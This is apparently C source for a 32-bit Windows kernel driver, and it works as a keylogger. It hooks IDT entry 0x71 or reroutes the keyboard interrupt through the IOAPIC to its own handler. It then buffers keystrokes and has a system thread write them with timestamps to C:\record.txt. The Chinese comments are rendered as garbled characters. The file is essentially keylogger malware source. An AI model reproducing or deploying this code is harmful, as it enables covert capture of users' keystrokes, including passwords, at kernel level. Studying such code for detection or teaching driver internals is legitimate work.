/*
*******************************************************************************
*= = �ļ����ƣ�MyMonitorDriver.c
*= = �ļ����������̼������MyMonitorDriver���ļ�
*= = ��    �ߣ���Ĭ��С��
*= = ��дʱ�䣺2016-07-09 19:18:00
*******************************************************************************
*/

#include "MyMonitorDriver.h"

//*============================================================================ 
//*= = ȫ�ֱ��� 
//*============================================================================

extern void *Origin_address = NULL;

//*============================================================================
//*= = �������ƣ�DriverEntry
//*= = ��������������������ں��� 
//*= = ��ڲ�����PDRIVER_OBJECT, PUNICODE_STRING 
//*= = ���ڲ�����NTSTATUS
//*============================================================================

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING RegistryPath
	){
	ULONG i;
	DbgPrint(("[*]MyDriver: entering DriverEntry\n"));

	//��ʱ�¼�
	timer = (PKTIMER)ExAllocatePoolWithTag(NonPagedPool, sizeof (KTIMER), 'INTE');

	if (!timer){
		DbgPrint("[*]Set timer Failed!\n");
		return;
	}
	UNLOAD_FLAG = FALSE;

	Write_to_file(0, "");

	//�����ڴ�
	RecordMemory = ExAllocatePool(NonPagedPool, IRECORD_SIZE);
	memset(RecordMemory, 0, IRECORD_SIZE);

	//ע���¼�
	//KeInitializeEvent(
	//	&event,
	//	SynchronizationEvent,		//SynchronizationEventΪͬ���¼�  
	//	FALSE						//����TRUE ʱ��ʼ���¼������ź�״̬.������FALSEʱ��ʼ���¼���û�ź�״̬,����˴�ΪTRUE,��Ϊ���ź�״̬��KeWaitForSingleObject��ֱ��ͨ������ʱ��Ҫ����KeResetEvent������Ϊ���ź�  
	//	);

	//ע���߳�
	HANDLE threadHandle = NULL;
	NTSTATUS status;
	status=PsCreateSystemThread(	//�����߳�  
		&threadHandle,  
		THREAD_ALL_ACCESS,
		NULL,
		NULL,
		NULL,
		RecordThread,				//���õĺ���  
		NULL						//PVOID StartContext ���ݸ������Ĳ���  
		);
	if (!NT_SUCCESS(status))
		return STATUS_UNSUCCESSFUL;

	ZwClose(threadHandle);

	// ж�غ�����
	DriverObject->DriverUnload = DriverUnload;

#ifdef BUILD_FOR_IDT_HOOK
	HookInt71(TRUE);
#else
	ResetIoApic(TRUE);
#endif
	return  STATUS_SUCCESS;
}

//*============================================================================
//*= = �������ƣ�RecordThread
//*= = ������������¼�������ļ����̺߳���  
//*= = ��ڲ�����VOID
//*= = ���ڲ�����VOID
//*============================================================================

VOID RecordThread() 
{
	DbgPrint("[*]CreateThread Successfully.\n"); 

	UCHAR *Buff;
	LARGE_INTEGER DueTime;
	INT Pos = 0;
	//int length;

	Buff = (PUCHAR)RecordMemory;

	while (1){	
		if (UNLOAD_FLAG)break;

		DueTime.QuadPart = (__int64)1000 * -10000;// run 1s=1000
		KeInitializeTimerEx(timer, NotificationTimer);
		KeSetTimerEx(timer, DueTime, 0, NULL);

		//KdPrint(("[*]MyDriver: Start wait.\r\n"));
		KeWaitForSingleObject(timer, Executive, KernelMode, FALSE, NULL);

		//KdPrint(("[*]MyDriver: End wait.\r\n"));
		////////////////////////////////�ȴ��¼�///////////////////////////////
		////�ȴ��ź�  														 //
		//KeWaitForSingleObject(											 //
		//	&event,					//����Ϊ ʱ��  �źţ��̣߳�ʱ�ӣ��������//  
		//	Executive,				//�ȴ�  								 //
		//	KernelMode,				//�ں�ģʽ								 //
		//	FALSE,															 //
		//	0																 //
		//	);																 //
		//KeResetEvent(&event);		//�����¼�								 //
		//////////////////////////////////����/////////////////////////////////
		//strlen((char *)RecordMemory);

		//ѭ�����ڴ�
		while (Buff[Pos] != 0x00){
			KdPrint(("[*]MyDriver: Write to file.\r\n"));

			CODE_S2K(Buff[Pos]);
			Buff[Pos] = 0x00;

			//pos��1
			Pos = (IRECORD_SIZE - 1 == Pos) ? 0 : Pos + 1;

			//Pos++;
			//if (IRECORD_SIZE == Pos)
			//	Pos = 0;
		}
		//д���ļ�
		//Write_to_file(0, (char *)RecordMemory);
		DbgPrint("[*]Create Thread has return.\n");
	}//end while

	//�ͷ��ڴ�
	ExFreePoolWithTag(timer, 'INTE');
	//�����̱߳����ú���PsTerminateSystemThreadǿ���߳̽�����������߳����޷��Զ��˳��ġ�    
	PsTerminateSystemThread(STATUS_SUCCESS);
}

//*============================================================================
//*= = �������ƣ�GetIdt
//*= = ������������sidtָ�����һ��P2C_IDTR�ṹ��������IDT�ĵ�ַ
//*= = ��ڲ�����VOID
//*= = ���ڲ�����VOID
//*============================================================================

void *GetIdt()
{
	P2C_IDTR idtr;

	// һ�����ȡ��IDT��λ�á�
	_asm sidt idtr
	return (void *)idtr.base;
}

//*============================================================================
//*= = �������ƣ�HookInt71
//*= = �����������޸�IDT���еĵ�0x71��ΪHookKeyboardInterrupt
//*= = ��ڲ�����VOID
//*= = ���ڲ�����VOID
//*============================================================================

void HookInt71(BOOLEAN hook_or_unhook)
{
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)GetIdt();
	idt_addr += 0x71;

	KdPrint(("[*]MyDriver: the current address = %x.\r\n",
		(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high)));

	if (hook_or_unhook){
		KdPrint(("[*]MyDriver: try to hook interrupt.\r\n"));

		// ���Origin_address��NULL����ô����hook ����ԭ��ַ��Origin_address
		Origin_address = (void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high);
		idt_addr->offset_low = P2C_LOW16_OF_32(MyInterruptProc);
		idt_addr->offset_high = P2C_HIGH16_OF_32(MyInterruptProc);

	}else{
		KdPrint(("[*]MyDriver: try to recovery interrupt.\r\n"));

		// ���Origin_address����NULL����ôȡ��hook.
		idt_addr->offset_low = P2C_LOW16_OF_32(Origin_address);
		idt_addr->offset_high = P2C_HIGH16_OF_32(Origin_address);

	}

	KdPrint(("[*]MyDriver: the current address = %x.\r\n",
		(void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high)));
}

//*============================================================================
//*= = �������ƣ�GetIdleIdtVec
//*= = ������������idt�����ҵ�һ�����е�idtentry,�½��ж�
//*= = ��ڲ�����VOID
//*= = ���ڲ�����UCHAR_8
//*============================================================================

UCHAR_8 GetIdleIdtVec()
{
	UCHAR_8 i;
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)GetIdt();

	// ��vec20������2a
	for (i = 0x20; i<0x2a; i++){

		//�������Ϊ0˵���ǿ���λ�ã�������Ӧid��
		if (idt_addr[i].type == 0){
			return i;
		}
	}
	return 0;
}

//*============================================================================
//*= = �������ƣ�CopyIdt71
//*= = ��������������ԭ����0x71�ϵ�idtentry���ı��жϴ�������ַ
//*= = ��ڲ�����VOID
//*= = ���ڲ�����UCHAR_8
//*============================================================================

UCHAR_8 CopyIdt71(UCHAR_8 id, void *interrupt_proc)
{
	//�޸�idt��Ӧ��������ַ
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)GetIdt();

	idt_addr[id] = idt_addr[0x71];
	idt_addr[id].offset_low = P2C_LOW16_OF_32(interrupt_proc);
	idt_addr[id].offset_high = P2C_HIGH16_OF_32(interrupt_proc);

	return id;
}

//*============================================================================
//*= = �������ƣ�SeachOrSetIrq1
//*= = ��������������IOAPIC��ü����жϣ������������ֵ
//*= = ��ڲ�����UCHAR_8
//*= = ���ڲ�����UCHAR_8
//*============================================================================

UCHAR_8 SeachOrSetIrq1(UCHAR_8 new_ch)
{
	// ѡ��Ĵ�����ֻʹ�õ�8λ��������λ����������
	UCHAR_8 *io_reg_sel;

	// ���ڼĴ�����������д��ѡ��Ĵ���ѡ���ֵ��32λ��
	ULONG_16 *io_win;
	ULONG_16 ch, ch1;

	// ����һ�������ַ�������ַΪ0xfec00000����IOAPIC�Ĵ�������Windows�ϵĿ�ʼ��ַ
	PHYSICAL_ADDRESS	phys;
	PVOID paddr;
	RtlZeroMemory(&phys, sizeof(PHYSICAL_ADDRESS));
	phys.u.LowPart = 0xfec00000;

	// �����ַ����ֱ�Ӷ�д��MmMapIoSpace�������ַӳ��Ϊϵͳ�ռ�������ַ������Ϊ0x14
	paddr = MmMapIoSpace(phys, 0x14, MmNonCached);

	// ���ӳ��ʧ���򷵻�0.
	if (!MmIsAddressValid(paddr))
		return 0;

	// ѡ��Ĵ�����ƫ��Ϊ0
	io_reg_sel = (UCHAR_8 *)paddr;
	// ���ڼĴ�����ƫ��Ϊ0x10.
	io_win = (ULONG_16 *)((UCHAR_8 *)(paddr)+0x10);

	// ѡ���0x12��irq1����
	*io_reg_sel = 0x12;
	ch = *io_win;

	// ���new_ch��Ϊ0�����Ǿ�������ֵ�������ؾ�ֵ��
	if (new_ch != 0)
	{
		ch1 = *io_win;
		ch1 &= 0xffffff00;
		ch1 |= (ULONG_16)new_ch;
		*io_win = ch1;

		KdPrint(("[*]SeachOrSetIrq1:set %2x to irq1.\r\n", (UCHAR_8)new_ch));
	}

	// ���ڼĴ��������32λ��ֵ������ֻ��Ҫһ���ֽڡ�
	//����ֽھ����ж�������ֵ��
	ch &= 0xff;
	MmUnmapIoSpace(paddr, 0x14);

	KdPrint(("[*]SeachOrSetIrq1: the old vec of irq1 is %2x.\r\n", (UCHAR_8)ch));

	return (UCHAR_8)ch;
}

//*============================================================================
//*= = �������ƣ�ResetIoApic
//*= = �����������ض�λIOAPIC��
//*= = ��ڲ�����BOOLEAN
//*= = ���ڲ�����VOID
//*============================================================================

void ResetIoApic(BOOLEAN set_or_recovery)
{
	static UCHAR_8 idle_id = 0;
	PP2C_IDTENTRY idt_addr = (PP2C_IDTENTRY)GetIdt();
	UCHAR_8 old_id = 0;

	if (set_or_recovery){
		// �������µ�ioapic��λ����ô��Ҫ��Origin_address�б���ԭ��������ڵ�ַ
		idt_addr = (PP2C_IDTENTRY)GetIdt();
		idt_addr += 0x71;
		Origin_address = (void *)P2C_MAKELONG(idt_addr->offset_low, idt_addr->offset_high);

		// ���һ������λ����irq1�����ж��Ÿ��ƽ�ȥ��
		// �滻����ת����Ϊ���ǵ��Լ��Ĵ�������
		idle_id = GetIdleIdtVec();
		if (idle_id != 0){
			CopyIdt71(idle_id, MyInterruptProc);
			// Ȼ�����¶�λ������жϡ�
			old_id = SeachOrSetIrq1(idle_id);
			// ��32λWindows7�µõ��ж�Ϊ0x71��
			ASSERT(old_id == 0x71);
		}
	}else{
		// �ָ�ԭ���ж�
		old_id = SeachOrSetIrq1(0x71);

		ASSERT(old_id == idle_id);

		// �����ж��ŵ�type = 0ʹ֮����
		idt_addr[idle_id].type = 0;
	}
}

//*============================================================================
//*= = �������ƣ�GetCurTime
//*= = ������������ȡ��ǰʱ��
//*= = ��ڲ�����NULL
//*= = ���ڲ�����PWCHAR
//*============================================================================

PCHAR GetCurTime()
{
	LARGE_INTEGER snow, now;
	TIME_FIELDS nowFields;
	static WCHAR timeStr[32] = { 0 };
	static CHAR CtimeStr[32+10] = { 0 };
	int i;


	//��ñ�׼ʱ��
	KeQuerySystemTime(&snow);
	//ת��Ϊ����ʱ��
	ExSystemTimeToLocalTime(&snow, &now);
	//ת��Ϊ���ǿ�������ʱ���ʽ
	RtlTimeToTimeFields(&now, &nowFields);
	//��ӡ���ַ�����
	RtlStringCchPrintfW(
		timeStr,
		32 * 2,
		L"%4d/%d/%d %2d:%2d:%2d    ",
		nowFields.Year, nowFields.Month, nowFields.Day,
		nowFields.Hour, nowFields.Minute, nowFields.Second
		);

	for (i = 0; i < 32; i++)
		CtimeStr[i] = (CHAR)timeStr[i];

	return CtimeStr;
}

//*============================================================================
//*= = �������ƣ�MyWrite_to_file
//*= = �������������ػ���Ϣд���ļ�����
//*= = ��ڲ�����CHAR* , CHAR*
//*= = ���ڲ�����VOID
//*============================================================================

void Write_to_file(char* file, char* str)
{
	NTSTATUS   status;
	OBJECT_ATTRIBUTES   oa;
	UNICODE_STRING   usname;
	HANDLE   handle;
	IO_STATUS_BLOCK   iostatus;   
	PVOID   buffer;
	ULONG   nbytes;

	static BOOLEAN START_FLAG = TRUE;

	CHAR Buff[IRECORD_SIZE] = { 0 };
	INT i = 0;
	CHAR* CurTime;
	INT Length;

	//��ʼ��Ŀ���ļ�λ��
	RtlInitUnicodeString(&usname, L"\\DosDevices\\C:\\record.txt");
	InitializeObjectAttributes(&oa, &usname, OBJ_CASE_INSENSITIVE, NULL, NULL);

	//�����ļ����
	status = ZwCreateFile(&handle, GENERIC_READ | FILE_APPEND_DATA, 
		&oa, &iostatus, NULL, FILE_ATTRIBUTE_NORMAL, 
		0, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	//RtlStringCchCopyA(buf, 30, GetCurTime());

	//д��ʱ��
	CurTime = GetCurTime();
	START_FLAG ? 
		strcat(CurTime, "[Start]"), START_FLAG = FALSE : strcat(CurTime, "[Input]: ");

	//if (START_FLAG){
	//	strcat(CurTime, "[Start]: ");
	//	START_FLAG = FALSE;
	//}
	//else
	//	strcat(CurTime, "[Input]: ");

	Length = strlen(CurTime);
	status = ZwWriteFile(handle, NULL, NULL, NULL, &iostatus, CurTime, Length, NULL, NULL);
	//status = ZwWriteFile(handle, NULL, NULL, NULL, &iostatus, "[Input]: ", 9, NULL, NULL);

	while (str[i]){
		Buff[i] = str[i];
		i++;
	}
	//strcat(Buff, "\r\n");

	//д������
	status = ZwWriteFile(handle, NULL, NULL, NULL, &iostatus, Buff, i, NULL, NULL);
	status = ZwWriteFile(handle, NULL, NULL, NULL, &iostatus, "\r\n", 2, NULL, NULL);

	//�ͷ�
	ZwClose(handle);
}

#define  DELAY_ONE_MICROSECOND  (-10)
#define  DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
#define  DELAY_ONE_SECOND (DELAY_ONE_MILLISECOND*1000)

//*============================================================================
//*= = �������ƣ�MyWrite_to_file
//*= = ����������ж�غ���
//*= = ��ڲ�����CHAR* , CHAR*
//*= = ���ڲ�����VOID
//*============================================================================

void DriverUnload(PDRIVER_OBJECT drv)
{
	LARGE_INTEGER interval;

	UNLOAD_FLAG = TRUE;

#ifdef BUILD_FOR_IDT_HOOK
	HookInt71(FALSE);
#else
	ResetIoApic(FALSE);
#endif
	DbgPrint(("[*]MyDriver:unloading\n"));

	//�ڴ��ͷ�
	ExFreePool((PVOID)RecordMemory);
	//ExFreePoolWithTag(timer, 'INTE');

	// ˯��5�롣�ȴ�����irp�������
	interval.QuadPart = (5 * 1000 * DELAY_ONE_MILLISECOND);
	KeDelayExecutionThread(KernelMode, FALSE, &interval);
}

//*============================================================================
//*= = �ļ����� 
//*============================================================================